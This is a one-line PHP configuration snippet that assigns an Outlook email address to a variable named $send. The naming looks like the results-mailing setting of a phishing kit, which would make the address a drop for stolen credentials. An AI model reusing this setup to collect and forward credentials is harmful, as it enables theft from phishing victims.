<?
$send="myrezultlikan@outlook.com";
?>